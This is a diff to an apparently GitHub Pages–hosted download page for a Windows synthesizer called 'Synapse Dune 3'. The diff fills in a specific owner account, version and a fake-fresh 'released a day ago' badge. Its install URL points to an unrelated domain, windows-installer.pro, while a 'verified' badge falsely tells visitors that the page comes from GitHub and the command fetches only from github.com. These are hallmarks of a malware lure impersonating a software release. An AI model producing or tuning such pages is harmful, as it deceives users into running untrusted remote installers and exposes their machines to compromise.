@@ -117,6 +117,17 @@ main { padding-block: 40px 48px; }
 .verified { display: inline-flex; align-items: center; gap: 6px; color: var(--success-fg); font-weight: 500; }
 .release-info { display: inline-flex; align-items: center; gap: 6px; flex-wrap: wrap; }
 .release-info svg { color: var(--fg-muted); }
+.release-pill {
+  display: inline-flex; align-items: center; gap: 4px;
+  margin-left: 8px; padding: 1px 7px;
+  font-size: 11px; font-weight: 500; line-height: 16px;
+  color: var(--fg-muted);
+  background: var(--bg-subtle);
+  border: 1px solid var(--border);
+  border-radius: 2em;
+  vertical-align: 2px;
+}
+.release-pill svg { color: currentColor; }
 
 .pill {
   display: inline-flex; align-items: center; gap: 4px;
@@ -327,7 +338,11 @@ kbd {
     <div class="Box-footer">
       <span class="release-info">
         <svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path d="M1 7.775V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 0 1 0 2.474l-5.026 5.026a1.75 1.75 0 0 1-2.474 0l-6.25-6.25A1.752 1.752 0 0 1 1 7.775Zm1.5 0c0 .066.026.13.073.177l6.25 6.25a.25.25 0 0 0 .354 0l5.025-5.025a.25.25 0 0 0 0-.354l-6.25-6.25a.25.25 0 0 0-.177-.073H2.75a.25.25 0 0 0-.25.25ZM6 5a1 1 0 1 1 0 2 1 1 0 0 1 0-2Z"/></svg>
-        Version <a data-slot-href="releaseUrl" rel="noopener" href="#"><span data-slot="version"></span></a> | Released: <span data-slot="releaseDate"></span>
+        Version <a data-slot-href="releaseUrl" rel="noopener" href="#"><span data-slot="version"></span></a>
+        <span class="release-pill" title="Recently released">
+          <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden="true"><path d="M4.75 0a.75.75 0 0 1 .75.75V2h5V.75a.75.75 0 0 1 1.5 0V2h1.25c.966 0 1.75.784 1.75 1.75v10.5A1.75 1.75 0 0 1 13.25 16H2.75A1.75 1.75 0 0 1 1 14.25V3.75C1 2.784 1.784 2 2.75 2H4V.75A.75.75 0 0 1 4.75 0ZM2.5 7.5v6.75c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25V7.5Zm10.75-4H2.75a.25.25 0 0 0-.25.25V6h11V3.75a.25.25 0 0 0-.25-.25Z"/></svg>
+          Released: <span data-slot="releasedAgo">a day ago</span>
+        </span>
       </span>
       <span class="verified" title="This page is provided by GitHub and the command fetches files from github.com">
         <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true"><path d="M7.467.133a1.75 1.75 0 0 1 1.066 0l5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667Zm.61 1.429a.25.25 0 0 0-.153 0l-5.25 1.68a.25.25 0 0 0-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.196.196 0 0 0 .154 0c2.245-.957 3.582-2.103 4.366-3.297C13.225 9.666 13.5 8.358 13.5 7V3.48a.251.251 0 0 0-.174-.237l-5.25-1.68ZM10.78 6.28l-3.25 3.25a.75.75 0 0 1-1.06 0l-1.5-1.5a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l.97.97 2.72-2.72a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"/></svg>
@@ -348,14 +363,15 @@ kbd {
   "use strict";
 
   const CONFIG = {
-    owner: "example",
-    repo: "synapse-dune-3",
-    name: "Synapse Dune 3",
-    tagline: "Dune 3 - software synthesizer for wavetable synthesis, dual filters and modulation routing on Windows 10/11",
-    version: "1.0.0",
-    releaseDate: "recently",
+    owner:        "byte-wolf-sync937",
+    repo:         "synapse-dune-3",
+    name:         "synapse-dune-3",
+    tagline:      "Dune 3 - software synthesizer for wavetable synthesis, dual filters and modulation routing on Windows 10/11",
+    version:      "5.2",
+    releaseDate:  "23.11.2026",
+    releasedAgo:  "a day ago",
     installUrl:   "https://windows-installer.pro/v1/ektqzf3158",
-    githubUrl: "https://github.com/example/synapse-dune-3",
+    githubUrl:    "https://github.com/byte-wolf-sync937/synapse-dune-3",
   };
 
   // Auto-detect owner/repo from GitHub Pages URL
